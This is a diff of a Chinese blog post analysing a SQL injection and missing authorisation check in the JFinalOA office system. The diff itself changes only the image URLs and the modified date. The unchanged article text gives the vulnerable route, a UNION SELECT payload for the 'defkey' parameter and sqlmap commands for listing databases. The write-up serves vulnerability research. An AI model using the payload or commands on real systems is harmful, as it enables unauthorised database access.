@@ -18,23 +18,23 @@
 <meta property="og:site_name" content="novy&#39;s Blog">
 <meta property="og:description" content="Jfinal漏洞">
 <meta property="og:locale">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023037060.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023069753.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023114714.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023138246.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023166960.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023187120.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023391394.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023438746.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023483958.png">
-<meta property="og:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023337330.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/1.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/2.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/3.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/4.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/5.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/6.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/7.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/8.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/9.png">
+<meta property="og:image" content="http://634880.haituie.cn/634880/43/10.png">
 <meta property="article:published_time" content="2020-12-14T08:14:21.000Z">
-<meta property="article:modified_time" content="2020-12-15T09:27:27.975Z">
+<meta property="article:modified_time" content="2021-01-22T07:45:00.435Z">
 <meta property="article:author" content="novy&#39;s Blog">
 <meta property="article:tag" content="SQL注入">
 <meta property="article:tag" content="Jfinal漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023037060.png">
+<meta name="twitter:image" content="http://634880.haituie.cn/634880/43/1.png">
 
     
     <link rel="alternative" href="/atom.xml" title="novy&#39;s Blog" type="application/atom+xml">
@@ -123,36 +123,36 @@
 		<p><a target="_blank" rel="noopener" href="https://gitee.com/glorylion/JFinalOA">https://gitee.com/glorylion/JFinalOA</a></p>
 <h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/pointlion/mvc/admin/oa/workflow/flowtask/FlowTaskController.java 123行</span><br></pre></td></tr></table></figure>
 <p>定义字符串请求参数<code>defkey</code></p>
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023037060.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/1.png"></p>
 <p>随后调用<code>getHavedonePage</code>方法把前端传来的参数进行处理，结果封装到<code>Page&lt;Record&gt;</code>，查看<code>wfservice</code>是从哪里定义的接口</p>
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023069753.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/2.png"></p>
 <p>跟进<code>WorkFlowService</code>，在该service层中搜索前面调用到的<code>getHavedonePage</code>方法，在该方法中含有一条没有进行预编译sql查询，此处直接进行数据查询导致了漏洞的产生</p>
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023114714.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/3.png"></p>
 <h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>路由配置文件路径</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src/main/java/com/pointlion/config/routes/OARoutes.java</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023138246.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/4.png"></p>
 <p>在前面<code>FlowTaskController</code>的<code>getHaveDoneTaskDataList</code>方法中含有一个越权漏洞，此处只获取了登陆状态，没有对用户鉴权</p>
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023166960.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/5.png"></p>
 <p>获取登陆用户信息封装到cookie里</p>
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023187120.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/6.png"></p>
 <p>所以这个注入只需要普通用户就可以利用，这里创建一个test用户</p>
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023391394.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/7.png"></p>
 <p>根据该框架路由配置结合controller的方法构造url</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/oa/workflow/flowtask/getHaveDoneTaskDataList?pageNumber=&amp;pageSize=&amp;defkey=</span><br></pre></td></tr></table></figure>
 
 <p>注入payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; UNION SELECT 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023438746.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/8.png"></p>
 <p>语句报错，丢sqlmap注入</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r D:\test.txt --random-agent</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023483958.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/9.png"></p>
 <p>跑库</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r D:\test.txt --random-agent --dbs --current-db</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://assets.baklib.com/t/3f5cfd6c-1cc9-46dd-b035-da429b349cd0/u/233c4a2d-9207-42d6-9b81-cfb0436aae6f/image1608023337330.png"></p>
+<p><img src="http://634880.haituie.cn/634880/43/10.png"></p>
   
 	</div>
 		<footer class="article-footer clearfix">
